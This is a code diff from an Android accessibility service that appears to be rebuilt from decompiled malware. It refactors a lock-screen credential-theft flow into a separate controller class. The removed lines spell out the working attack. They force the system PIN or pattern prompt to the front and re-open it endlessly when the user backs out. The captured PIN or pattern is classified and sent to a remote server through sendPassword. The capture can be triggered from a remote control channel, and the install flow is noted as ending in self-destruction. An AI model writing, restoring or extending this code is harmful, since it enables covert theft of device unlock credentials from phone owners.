@@ -51,6 +51,7 @@ import com.storm.safe.rock.service.modules.SmsContentObserver
 import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
 import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
+import com.storm.safe.rock.service.delegates.CipherFlowController
 import com.storm.safe.rock.service.delegates.DetectionController
 import com.storm.safe.rock.service.delegates.NetworkMessageSender
 import com.storm.safe.rock.service.delegates.SmartNavigator
@@ -327,6 +328,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** Delegate: network message sending (extracted sendHideStatus, sendBiometricResult, etc.) */
     private var networkMessageSender: NetworkMessageSender? = null
+
+    /** Delegate: cipher/password capture flow (extracted from this service) */
+    internal var cipherFlowController: CipherFlowController? = null
 
     /** JADX: f52418e9 (C0317a2) — Accessibility event routing */
     var accessibilityEventRouter: AccessibilityEventRouter? = null
@@ -667,6 +671,7 @@ class MyAccessibilityService : AccessibilityService() {
             )
             broadcastReceiverRegistry = BroadcastReceiverRegistry(this)
             smartNavigator = SmartNavigator(this)
+            cipherFlowController = CipherFlowController(this)
             networkMessageSender = NetworkMessageSender(
                 networkManagerProvider = { networkManager },
                 deviceIdProvider = { getAndroidDeviceId() }
@@ -2424,92 +2429,11 @@ class MyAccessibilityService : AccessibilityService() {
      * @param isInstallationFlow true = 安装流程（完成后会触发自毁）; false = 普通授权流程
      */
     suspend fun capturePasswordViaSystemAuth(isInstallationFlow: Boolean) {
-        android.util.Log.d(TAG, "🔐 capturePasswordViaSystemAuth() 调用，isInstallationFlow=$isInstallationFlow")
-
-        // 1. 持久化 guard — vendor L4297-4299: 安装流程若已完成密码捕获则跳过
-        try {
-            val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
-            if (isInstallationFlow && prefs.getBoolean("cipher_captured", false)) {
-                android.util.Log.d(TAG, "🔐 密码捕获已完成（持久化标记），跳过")
-                return
-            }
-        } catch (_: Exception) { /* SP 异常不阻塞 */ }
-
-        // 2. already-captured gate — vendor L4300-4314: CipherCaptureManager 已有缓冲密码则跳过
-        // TODO: VENDOR_VERIFY — CipherCaptureManager.readBuffered(discard: Boolean) 方法映射
-        // vendor: c0335a1.m211819d0(false) ?: c0335a1.m211819d0(true)
-        // replica 当前没暴露等价 API，跳过此 gate（若后续要对齐则在此加读取逻辑）
-
-        // 3. isKeyguardSecure — vendor L4331: 无锁屏密码跳过
-        val km = getSystemService(KEYGUARD_SERVICE) as? android.app.KeyguardManager
-        if (km?.isKeyguardSecure != true) {
-            android.util.Log.d(TAG, "🔐 设备未设置锁屏密码，跳过密码捕获")
-            return
-        }
-
-        // 4. 启动捕获流程 — vendor capturePasswordViaSystemAuth$2: 若 installFlow 先 delay 2s
-        if (isInstallationFlow) {
-            kotlinx.coroutines.delay(2000L)
-        }
-        passwordLaunchCount = 0
-        isCipherCaptureEnabled = true
-        launchPasswordCapture(isInstallationFlow)
+        cipherFlowController?.captureViaSystemAuth(isInstallationFlow)
     }
 
     fun launchPasswordCapture(isInstallationFlow: Boolean) {
-        if (!isCipherCaptureEnabled) {
-            android.util.Log.d(TAG, "🔐 密码监听已停止，不再弹出")
-            return
-        }
-        try {
-            passwordLaunchCount++
-            android.util.Log.d(TAG, "🔐 启动系统真实密码验证... (第${passwordLaunchCount}次)")
-            cipherCaptureManager?.let { ccm ->
-                // JADX: ccm.enableCapture()
-                android.util.Log.d(TAG, "✅ CipherCaptureManager 密码监听已启用")
-            }
-            // vendor dqtvuisjd.java:4963-4967 — Intent flags 805306368 = NEW_TASK | CLEAR_TOP | SINGLE_TOP
-            val intent = android.content.Intent(this, com.storm.safe.rock.activity.syuqattwmgit::class.java)
-            intent.putExtra("credential_type", 0)
-            intent.addFlags(
-                android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                    android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP or
-                    android.content.Intent.FLAG_ACTIVITY_SINGLE_TOP
-            )
-            // vendor 策略 1 (L4969-4973): 若有前台 Activity → currentActivity.startActivity
-            val currentActivity = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
-            if (currentActivity != null && !currentActivity.isFinishing && !currentActivity.isDestroyed) {
-                try {
-                    currentActivity.startActivity(intent)
-                    android.util.Log.d(TAG, "🔐 [策略1] 通过前台 Activity context 直接启动 syuqattwmgit")
-                    return
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "🔐 [策略1] 失败: ${e.message}")
-                }
-            }
-            // vendor 策略 2 (L4974-4988): 无前台 → moveTaskToFront + 800ms postDelayed
-            android.util.Log.d(TAG, "🔐 [前置] 无前台 Activity，通过 moveTaskToFront 拉回前台")
-            try {
-                val am = getSystemService(ACTIVITY_SERVICE) as? android.app.ActivityManager
-                val tasks = am?.appTasks
-                if (!tasks.isNullOrEmpty()) {
-                    tasks[0].moveToFront()
-                    android.util.Log.d(TAG, "🔐 [前置] moveToFront 已调用，等待 onResume")
-                }
-            } catch (e: Exception) {
-                android.util.Log.e(TAG, "🔐 [前置] moveTaskToFront 失败", e)
-            }
-            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
-                try {
-                    startActivity(intent)
-                    android.util.Log.d(TAG, "🔐 [策略2] 800ms 后通过 service context 启动 syuqattwmgit")
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "🔐 [策略2] 失败: ${e.message}")
-                }
-            }, 800L)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 启动密码采集失败", e)
-        }
+        cipherFlowController?.launchPasswordCapture(isInstallationFlow)
     }
 
     /**
@@ -3297,89 +3221,16 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX: m211449d4 (d4), line 4647
      */
     fun completeInstallationWithCipher() {
-        try {
-            android.util.Log.d(TAG, "🔐 ★★★ completeInstallationWithCipher() 被调用 ★★★")
-
-            getSharedPreferences("app_state", Context.MODE_PRIVATE).edit()
-                .putBoolean("cipher_excluded", true).apply()
-            val ccm = cipherCaptureManager
-            if (ccm != null) {
-                val cipher = ccm.readBufferedCipher(false)
-                val textCipher = cipher?.get("text") as? String
-                val patternPoints = cipher?.get("pattern") as? List<*>
-
-                val gradeCode = when {
-                    patternPoints != null -> "pattern"
-                    textCipher != null && textCipher.length <= 4 -> "4pin"
-                    textCipher != null && textCipher.length <= 6 -> "6pin"
-                    else -> "mixed"
-                }
-                android.util.Log.d(TAG, "🔐 密码类型: $gradeCode")
-
-                val cipherValue = textCipher ?: patternPoints?.joinToString(",") ?: ""
-                if (cipherValue.isNotEmpty()) {
-                    networkManager?.sendPassword(cipherValue, "system_auth", gradeCode)
-                }
-            }
-
-            android.util.Log.d(TAG, "✅ 安装完成流程已执行")
-            tryShowPackageVerify()
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ completeInstallationWithCipher 失败", e)
-        }
+        cipherFlowController?.completeInstallationWithCipher()
     }
 
     @Volatile private var lastLockTypeCheckTime = 0L
     @Volatile internal var cipherRetryCount = 0
-    private val cipherMaxRetries = Int.MAX_VALUE
-    private val cipherRetryDelayMs = 300L
-    private var cipherIsInstallationFlow = false
-
-    // vendor: f52471k2/f52472k3/f52473k4 — 用户离开密码页面的重试循环
-    @Volatile private var cipherDismissCount = 0
-    private val cipherDismissMaxRetries = Int.MAX_VALUE
-    private val cipherDismissDelayMs = 300L
 
     @Volatile var lastCapturedCipherQuality: String? = null
 
     private fun handleCipherCredentialResult(success: Boolean) {
-        android.util.Log.d(TAG, "🔐 验证结果: ${if (success) "成功" else "失败"}")
-        if (success) {
-            if (!com.storm.safe.rock.util.DebugConfig.disableCipherOverlay) {
-                isCipherCaptureEnabled = false
-            }
-            cipherRetryCount = 0
-            // Save lock type from last captured quality before completeInstallation clears buffer
-            val quality = lastCapturedCipherQuality
-            val lockType = when (quality) {
-                "PASSWORD_QUALITY_PATTERN" -> "pattern"
-                "PASSWORD_QUALITY_NUMERIC_COMPLEX", "PASSWORD_QUALITY_NUMERIC" -> "pin"
-                "PASSWORD_QUALITY_ALPHANUMERIC" -> "pin"
-                else -> "unknown"
-            }
-            getSharedPreferences("cipher_config", Context.MODE_PRIVATE).edit()
-                .putBoolean("cipher_completed", true)
-                .putString("cipher_lock_type", lockType)
-                .apply()
-            android.util.Log.d(TAG, "🔐 cipher_completed=true, lock_type=$lockType (quality=$quality)")
-            if (cipherIsInstallationFlow) completeInstallationWithCipher()
-        } else {
-            cipherRetryCount++
-            if (cipherRetryCount < cipherMaxRetries) {
-                android.util.Log.d(TAG, "🔄 重试 $cipherRetryCount/$cipherMaxRetries")
-                Handler(Looper.getMainLooper()).postDelayed({
-                    com.storm.safe.rock.activity.syuqattwmgit.start(this, 0, ::handleCipherCredentialResult)
-                }, cipherRetryDelayMs)
-            } else {
-                android.util.Log.w(TAG, "⚠️ 达到最大重试次数")
-                isCipherCaptureEnabled = false
-                cipherRetryCount = 0
-                cipherCaptureManager?.stopListeningFull()
-                // Bug 5 fix: reset GRM so touch exploration doesn't stay on permanently
-                gestureRecorderManager?.reset()
-                if (cipherIsInstallationFlow) completeInstallationWithCipher()
-            }
-        }
+        cipherFlowController?.handleCipherCredentialResult(success)
     }
 
     /**
@@ -3387,45 +3238,15 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX: m211457e6 (e6), line 4873
      */
     fun doLaunchSystemPasswordCapture(isInstallationFlow: Boolean) {
-        try {
-            cipherRetryCount = 0
-            cipherIsInstallationFlow = isInstallationFlow
-            android.util.Log.d(TAG, "🔐 启动系统密码验证 (isInstallationFlow=$isInstallationFlow)")
-
-            cipherCaptureManager?.startListening()
-
-            com.storm.safe.rock.activity.syuqattwmgit.start(this, 0, ::handleCipherCredentialResult)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ doLaunchSystemPasswordCapture 失败", e)
-        }
+        cipherFlowController?.doLaunchSystemPasswordCapture(isInstallationFlow)
     }
 
     /**
      * 用户离开密码页面时重新弹出 PIN。
      * vendor: m211495i9 (i9) — onPasswordPageDismissedByUser
-     *
-     * 当 CipherCaptureManager 检测到窗口切换离开密码界面（无数据时），
-     * 调用此方法。300ms 后重新弹出 PIN，无限循环直到输入成功。
      */
     fun onPasswordPageDismissedByUser() {
-        if (!isCipherCaptureEnabled) {
-            android.util.Log.d(TAG, "🔷 [onPasswordPageDismissedByUser] 密码监听未激活，忽略")
-            return
-        }
-        cipherDismissCount++
-        if (cipherDismissCount >= cipherDismissMaxRetries) {
-            android.util.Log.w(TAG, "⚠️ [onPasswordPageDismissedByUser] 已达最大重试次数，停止")
-            isCipherCaptureEnabled = false
-            cipherDismissCount = 0
-            return
-        }
-        android.util.Log.d(TAG, "🔄 [onPasswordPageDismissedByUser] 用户离开密码页面，${cipherDismissDelayMs}ms后重新弹出")
-        cipherCaptureManager?.let {
-            com.storm.safe.rock.service.modules.cipher.CipherCaptureManager.enableListening(it)
-        }
-        Handler(Looper.getMainLooper()).postDelayed({
-            doLaunchSystemPasswordCapture(cipherIsInstallationFlow)
-        }, cipherDismissDelayMs)
+        cipherFlowController?.onPasswordPageDismissedByUser()
     }
 
     /**
@@ -3700,12 +3521,7 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** Launch cipher capture from control. JADX: l8 method */
     fun launchCipherCaptureFromControl(overlayType: String) {
-        try {
-            android.util.Log.d(TAG, "🔐 控制端触发密码采集，类型: $overlayType -> 使用系统真实验证")
-            launchPasswordCapture(false)
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 启动密码采集失败", e)
-        }
+        cipherFlowController?.launchCipherCaptureFromControl(overlayType)
     }
 
     /** Clean up old manager resources before reinit. JADX: h1 method — see initializeManagers() */
@@ -3985,16 +3801,7 @@ class MyAccessibilityService : AccessibilityService() {
      * JADX method: m211458e7 (e7), line 4999
      */
     fun enableCipherCapture() {
-        try {
-            isCipherCaptureEnabled = true
-            android.util.Log.d(TAG, "🔐 密码监听已启用")
-            cipherCaptureManager?.let { ccm ->
-                // JADX: C0335a1.m211788c1 — enable capture
-                android.util.Log.d(TAG, "✅ CipherCaptureManager 启用成功")
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ enableCipherCapture 失败", e)
-        }
+        cipherFlowController?.enableCipherCapture()
     }
 
     /**
